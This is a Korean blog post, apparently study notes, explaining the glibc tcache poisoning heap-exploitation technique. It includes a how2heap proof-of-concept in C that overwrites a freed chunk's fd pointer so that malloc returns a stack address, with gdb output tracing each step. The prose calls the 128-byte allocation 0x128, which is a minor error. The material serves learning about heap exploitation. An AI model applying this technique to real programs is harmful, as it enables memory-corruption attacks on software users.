---
title: tcache Poisoning
author: Beomsu Lee
category: [Exploitation, Heap]
tags: [exploitation, heap, tcache]
math: true
mermaid: true
---


## Description

임의의 포인터를 반환한다. fastbin corruption과 유사하다.

## Exploit plan

1. `stack_var` 선언
2. `a` heap 영역 할당(0x128)
3. `a` 해당 영역 `free()`
4. `a->fd` 영역 `&stack_var`로 변조
5. 1st Heap 영역 할당
6. 2nd Heap 영역 할당
    - 할당 시 `stack_var` 영역이 할당됨

## Proof of concept

```c
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>

int main()
{
    fprintf(stderr, "This file demonstrates a simple tcache poisoning attack by tricking malloc into\n"
           "returning a pointer to an arbitrary location (in this case, the stack).\n"
           "The attack is very similar to fastbin corruption attack.\n\n");

    size_t stack_var;
    fprintf(stderr, "The address we want malloc() to return is %p.\n", (char *)&stack_var);

    fprintf(stderr, "Allocating 1 buffer.\n");
    intptr_t *a = malloc(128);
    fprintf(stderr, "malloc(128): %p\n", a);
    fprintf(stderr, "Freeing the buffer...\n");
    free(a);

    fprintf(stderr, "Now the tcache list has [ %p ].\n", a);
    fprintf(stderr, "We overwrite the first %lu bytes (fd/next pointer) of the data at %p\n"
        "to point to the location to control (%p).\n", sizeof(intptr_t), a, &stack_var);
    a[0] = (intptr_t)&stack_var;

    fprintf(stderr, "1st malloc(128): %p\n", malloc(128));
    fprintf(stderr, "Now the tcache list has [ %p ].\n", &stack_var);

    intptr_t *b = malloc(128);
    fprintf(stderr, "2nd malloc(128): %p\n", b);
    fprintf(stderr, "We got the control\n");

    return 0;
}
```

`stack_var(0x7fffffffe2a0)` 선언한다.

```
The address we want malloc() to return is 0x7fffffffe2a0.
```

`malloc(0x128)`로 heap 영역 할당한다.

```
Allocating 1 buffer.
malloc(128): 0x555555756260
```

해당 영역 `free()` 시 `tcache list`에 `a`가 들어가게 된다.

```
Now the tcache list has [ 0x555555756260 ].
(0x90)   tcache_entry[7](1): 0x555555756260
```

0x555555756260의 처음 8 byte를 stack 영역으로 overwrite 된다.

```
We overwrite the first 8 bytes (fd/next pointer) of the data at 0x555555756260
to point to the location to control (0x7fffffffe2a0).
```

**overwrite 후 `fd`**

```
gdb-peda$ parseheap
addr                prev                size                 status              fd                bk                
0x555555756000      0x0                 0x250                Used                None              None
0x555555756250      0x0                 0x90                 Freed     0x7fffffffe2a0              None
```

1st `malloc(0x128)` 시 `tcache`엔 `stack_var` 영역이 들어간다.

```
1st malloc(128): 0x555555756260
(0x90)   tcache_entry[7](0): 0x7fffffffe2a0 --> 0x5555555549a0 --> 0x41d7894956415741 (invaild memory)
Now the tcache list has [ 0x7fffffffe2a0 ].
```

2nd `malloc(0x128)` 시 `stack_var` 영역이 할당된다.

```
[----------------------------------registers-----------------------------------]
RAX: 0x7fffffffe2a0 --> 0x5555555549a0 (<__libc_csu_init>:  push   r15)
[-------------------------------------code-------------------------------------]
0x55555555493d <main+371>:  call   0x555555554690 <malloc@plt> <- 2nd malloc
=> 0x555555554942 <main+376>:   mov    QWORD PTR [rbp-0x10],rax
2nd malloc(128): 0x7fffffffe2a0
We got the control
```

## References
- [tcache_poisoning.c](https://github.com/beomsu317/how2heap/blob/master/glibc_2.26/tcache_poisoning.c)